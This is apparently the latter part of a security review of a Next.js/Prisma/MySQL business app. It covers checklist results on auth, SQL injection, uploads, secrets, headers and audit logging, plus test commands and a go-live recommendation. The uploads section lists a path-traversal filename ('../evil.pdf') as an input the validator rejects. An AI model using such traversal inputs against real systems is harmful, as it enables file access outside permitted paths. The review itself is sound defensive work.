| Hiding a menu item is not authorisation | **Pass.** Verified by invocation path, not inspection. Pages resolve data through actions and render the guard's own refusal (audit trail) or redirect (users, settings) — the guard is never the UI's job. |
| IDOR — ids validated against the caller's scope | **Pass.** Single-tenant: all staff legitimately see all business data. The one owner-scoped resource, `report_presets`, filters on `user_id` in `getPreset`/`updatePreset`/`deletePreset`, with the owner id taken from the session and never from the client; a foreign id is "not found", not a leak. `/api/files/[id]` accepts only the 32-hex generated name — unguessable, never client-supplied. |
| Deactivated user's session revoked immediately | **Pass.** Two mechanisms: `deactivateUser` and `updateUser` delete every `sessions` row in the same transaction as the flag flip, and `refreshDbSession` (`auth.ts:337-349`) re-reads the row on *every* request and deletes it when `is_active` is false. Verified that returning `null` from the `jwt` callback clears the cookie (`@auth/core/src/lib/actions/session.ts:82-83`). Role changes propagate the same way — no re-login needed. |

### Injection & data access

| Item | Result |
|---|---|
| Raw SQL uses `Prisma.sql` tagged templates | **Pass.** All **45** `$queryRaw` call sites across 9 services (`report`, `dashboard`, `advance`, `billing`, `receipt`, `bill-search`, `bill-number`, `loan`, `search`) receive either a `Prisma.sql` template directly or a builder function that returns one. `Prisma.raw` appears **nowhere** in `src/`; `$queryRawUnsafe` / `$executeRawUnsafe` appear nowhere. No string-concatenated query exists. |
| Report filters allow-listed, not interpolated | **Pass.** `groupBy` is a Zod enum *and* is then looked up in a frozen `Prisma.Sql` fragment map (`BILL_GROUP_COLUMNS`, `EXPENSE_GROUP_COLUMNS`), with an unknown key throwing rather than reaching SQL. Every `ORDER BY` in the report, dashboard, loan and advance services is fixed literal text — there is no client-supplied sort column or sort direction anywhere in the codebase. Dynamic predicates are composed as `Prisma.Sql[]` joined with `Prisma.join`, values always bound. Date ranges and id lists are Zod-parsed before they become binds. |
| Zod at every boundary, including exports and route handlers | **Pass.** Every action Zod-parses before touching a service. The export route validates `report` against a 13-entry allow-list, `format` against `z.enum(["csv","xlsx","pdf"]).catch("csv")`, and the query through the matching per-report schema — a parse failure is a plain-language 400. Pages that read `searchParams` sanitise with explicit patterns/allow-lists before calling the action, which re-validates. |

### Authentication

| Item | Result |
|---|---|
| argon2id with sane parameters | **Pass.** `@node-rs/argon2`, `{ algorithm: Argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1, outputLen: 32 }` — the OWASP baseline — in `auth.ts:44-50` and matched in `prisma/seed.ts:688`. No MD5/SHA1/bcrypt anywhere. SHA-256 appears only as the session-token digest, which is correct (a 256-bit random token needs no stretching). |
| Rate limiting on `/login` (5 / 15 min / IP) | **Pass**, with the deployment dependency in F02. `RATE_LIMIT_MAX_ATTEMPTS = 5`, `RATE_LIMIT_WINDOW_MS = 15 min`, checked before any password work. A second per-email bucket (10 / 15 min) blocks cross-IP spraying, ordered after password verification so a full bucket cannot lock out the legitimate owner (P0-F07). In-memory by design — see §5. |
| Cookies `httpOnly` + `secure` + `sameSite=lax` | **Partial.** `httpOnly` and `sameSite=lax` are unconditional Auth.js defaults. `secure` is derived from the resolved origin and is not enforced → **F01**. |
| Session idle timeout enforced server-side | **Pass.** `expires_at` is authoritative in the `sessions` table; `refreshDbSession` deletes an expired row before honouring it and slides the expiry (throttled to once per 5 min). The window comes from `settings.session.idle_timeout_hours`, Zod-bounded 1–720 h with a `.catch(8)`. A JWT that outlives its DB row is worthless. |
| No user enumeration | **Pass.** Unknown email, wrong password and deactivated account all raise the identical `CredentialsSignin` with `code = "invalid_credentials"`, and the login page renders one message. Timing is equalised by verifying against a real throwaway argon2id hash when the email is unknown (`verifyAgainstDummy`), so the ~30 ms cost is paid either way. |
| `must_change_password` enforced on first login | **Pass**, at four independent layers: `authorizeAction` refuses every action except `changePasswordAction` (P0-F04); the `(app)` layout redirects; both API route handlers return 403; and the flag is re-read from the DB row on every request rather than from the JWT snapshot. Correctly *not* enforced in middleware, which would bounce a just-changed user on a stale claim. |

### Uploads

| Item | Result |
|---|---|
| Extension allow-list (pdf, jpg, png) | **Pass.** `CLIENT_NAME_RE = /^[^./\\]+\.(pdf\|jpg\|png)$/` — case-sensitive, single dot, no separators. Rejects `scan.PDF`, `x.pdf.jpg`, `../evil.pdf`, `a/b.pdf` and absolute paths at the door. |
| 5 MB cap | **Enforced in the service, unreachable in practice** — the Server Action body limit bites first → **F07**. |
| MIME sniffing not trusted | **Pass**, and better than the checklist asks: the declared extension must *match* the sniffed magic bytes (`%PDF-`, `FF D8 FF`, the 8-byte PNG signature). A `.png` containing a PDF is refused. |
| Stored outside the web root, served through an authenticated route | **Pass**, with the fallback caveat in **F13**. Files live under `UPLOAD_DIR`; Next serves only `public/`; the sole read path is `GET /api/files/[id]` behind `requireAuth`. |
| Client filename never used as a path | **Pass.** The stored name is always `randomBytes(16).toString("hex") + "." + ext`. The client name is used only to derive the extension, and only after passing `CLIENT_NAME_RE`. Path traversal is impossible by construction, and `resolveUploadPath` re-validates against `GENERATED_NAME_RE` and asserts containment under the root on the way back out. |

### Secrets & configuration

| Item | Result |
|---|---|
| No secrets in the repo | **Pass.** `git log --all --diff-filter=A` shows `.env` was never committed, in any commit. `.gitignore` has `.env` + `.env.*` with `!.env.example`. A pattern scan over all tracked files for assigned credentials returns nothing. |
| `.env.example` documents every key without values | **Pass.** All 10 keys present, every value empty, each with a comment explaining what it is and why (the `DATABASE_URL` / `DATABASE_URL_APP` split is documented particularly well). |
| `AUTH_SECRET` strong and environment-supplied | **Pass.** Read from `process.env` only. `.env.example` prescribes `openssl rand -base64 32`; the dev value is 44 chars (32 bytes base64). Middleware treats a missing secret as signed-out — fail closed. |
| App MySQL user has DML only | **Pass — verified live.** `SHOW GRANTS FOR CURRENT_USER()` as the app user returns `USAGE ON *.*` plus `SELECT, INSERT, UPDATE, DELETE` on the app schemas only. No `DROP`, no `GRANT`, no `ALTER`, no global privileges. |
| Migrations use a separate privileged user | **Pass — verified live.** `cnf_migrate`, a distinct account with `ALL PRIVILEGES` on the app + shadow schemas, wired only through `prisma.config.ts`. `src/server/db.ts` prefers `DATABASE_URL_APP`. |
| MySQL bound to `127.0.0.1`, 3306 not public | **Pass on the reviewed host** (`@@bind_address = 127.0.0.1`, MySQL 8.4.11). Production reproduction depends on the provisioning asset → **F02**. |

### Headers & transport

| Item | Result |
|---|---|
| `X-Frame-Options: DENY` | **Pass** — `next.config.ts`, applied to `/(.*)`, route handlers included. |
| `X-Content-Type-Options: nosniff` | **Pass.** |
| `Referrer-Policy` | **Pass** — `strict-origin-when-cross-origin`. |
| CSP | **Partial** — four directives enforced, `script-src`/`default-src` Report-Only → **F05**. |
| HSTS | **Absent** → **F02**. |
| HTTPS enforced, HTTP→HTTPS redirect at Nginx | **Absent** → **F02**. |
| Server Action origin checks not disabled | **Pass.** `next.config.ts` sets no `experimental.serverActions` block at all, so Next 15's built-in Origin/Host comparison is active and `allowedOrigins` is untouched. This must stay true when **F07**'s `bodySizeLimit` is added — add the key, do not add `allowedOrigins`. |

### Audit & integrity

| Item | Result |
|---|---|
| Every financial mutation writes `audit_log` with before/after and the acting user | **Pass.** 37 distinct literal action verbs across 15 audit-writing services, plus the `${verb}_CREATED/_UPDATED/_DEACTIVATED` family the generic master-data factory emits; every one goes through `writeAudit(tx, …)` *inside* the mutation's own `prisma.$transaction`, so the audit row commits or rolls back with the change. Bills, advances (including reversal), receipts, expenses, loans, jobs, users, settings, templates and master data are all covered. `user_id` always comes from the session guard, never from the client. |
| Audit log append-only | **Pass in the application** — `audit.service.ts` exports no update or delete path, and the only two `auditLog.` call sites in the repository are `create`. **Not enforced in the database** → **F04**. |
| Can a user edit an issued bill without leaving a trail? | **No.** Verified by walking every write path to `bills`. `updateDraftBill` and `applyBillTemplate` both refuse unless `status === "DRAFT"`. Past DRAFT, the only routes are `amendBillAction` and `cancelBillAction`, both `authorizeAction("ADMIN")`, both writing `BILL_AMENDED` / `BILL_CANCELLED` with full before/after snapshots, and both reversing dependent advance adjustments (`ADVANCE_REVERSED`) inside the same transaction. `issueBill` flips status with a guarded `updateMany where status = DRAFT`, so a concurrent double-issue cannot slip through. No bill is ever deleted. |
| No password material in audit snapshots | **Pass.** `user.service.ts` builds before/after from explicit field lists (`name`, `role`, `is_active`, `must_change_password`); `password_hash` never enters an audit row, an action result or a list projection. |

### Dependencies

| Item | Result |
|---|---|
| `npm audit` clean of High/Critical | **Pass** — `pnpm audit --audit-level=high` exits 0. One moderate, analysed and not reachable → **F12**. |
| Lockfile committed | **Pass** — `pnpm-lock.yaml` tracked; `packageManager: pnpm@11.21.0`; `engines.node >= 22`. |
| No unpinned or abandoned packages | **Pass.** `next`, `next-auth` and `react` are exact-pinned; the rest are caret ranges resolved by the lockfile. All are current, maintained releases. `next-auth@5.0.0-beta.32` is a beta by necessity (v5 has no stable release) — pinned exactly, which is the right handling. |

---

## 5. Additional notes (no fix task filed)

**Login rate-limit state is in-memory.** `loginAttempts` / `emailLoginAttempts` are module-level
`Map`s, so a PM2 restart clears every counter and a second instance would not share them.
This is documented in `auth.ts:76-84` and is a correct trade for the single-process
deployment plan.md §15 specifies. Two things to carry forward rather than fix: if the
deployment ever becomes multi-instance, this must move to the database or Redis *before* the
second instance starts; and `docs/deployment.md` should note that `pm2 reload` resets the
lockout window, so a restart loop would defeat it.

**`requestIp` fail-open vs `clientIp` fail-closed.** The divergence is deliberate and right —
an audit row with a null IP is better than a refused mutation, while a login with an
untrustworthy IP is worse than no login. Worth one sentence in whichever module F10
consolidates into, so the asymmetry reads as a decision.

---

## 6. Verification performed

| Command | Result |
|---|---|
| `pnpm audit --audit-level=high` | **exit 0** — 1 moderate, 0 high, 0 critical (F12) |
| `pnpm test` | **exit 0** — 92 files, 1124 tests passed |
| `pnpm build` | **exit 0** |
| `pnpm lint` | **exit 0** |
| `SHOW GRANTS FOR CURRENT_USER()` as `cnf_app` and `cnf_migrate` | DML-only vs DDL split confirmed; `@@bind_address = 127.0.0.1` |

All three gate commands pass on the working tree as of the end of this review. (An earlier
run during the review showed 9 ESLint errors, all from other Phase 7 workers' in-flight
files — unused imports in the P7-T005 edits to `scripts/integrity-check.ts` and an untracked
`.probe.tmp.ts` probe from P7-T002. Both were resolved by their owners before this review
finished; linting `src`, `tests` and `prisma` in isolation was clean throughout.)

This review changed exactly one file — `docs/security-review.md`, the deliverable. No
production code was modified.

---

## 7. Gate recommendation

**Not clear for go-live yet.** Two High findings are open, both in transport/deployment, and
both are closed by P7-T006 plus the one-line `useSecureCookies` change in F01.

Suggested order:

1. **P7-F01** — the `useSecureCookies` + `AUTH_URL` assertion. Small, in code, and it removes
   the class of failure entirely rather than relying on the Nginx file being right.
2. **P7-F02** — the deployment assets. Blocks go-live on its own; F01 stops it from being
   silently fatal if a header is later dropped.
3. **P7-F03**, **P7-F04** — both small, both close real gaps in paths an Admin trusts.
4. **P7-F05**, **P7-F06**, **P7-F07** — before UAT.
5. **P7-F08** – **P7-F13** — before or shortly after go-live; none blocks it.

Re-review at **P7-G1** should re-run `pnpm audit`, re-verify the production `SHOW GRANTS`
against the real `cnf_prod` schema, confirm the deployed response headers with
`curl -sI https://<domain>` (HSTS present, CSP enforced, four app headers), and confirm the
session cookie arrives as `__Secure-authjs.session-token` with `Secure; HttpOnly; SameSite=Lax`.
